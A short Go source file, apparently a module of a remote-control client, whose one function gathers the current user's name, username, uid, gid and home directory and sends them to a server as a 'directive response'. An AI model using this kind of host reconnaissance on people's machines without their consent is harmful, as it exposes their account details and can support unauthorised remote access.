package linux

import (
	"corpotecht_client/crossplatform"
	"net/url"
	"os/user"
)

// UserInfo - name says it all
func UserInfo() {
	userdetails, _ := user.Current()

	// Send to server
	payload := url.Values{
		"name":     {userdetails.Name},
		"username": {userdetails.Username},
		"gid":      {userdetails.Gid},
		"uid":      {userdetails.Uid},
		"homedir":  {userdetails.HomeDir},
	}
	crossplatform.SendDirectiveResponse(payload)
}
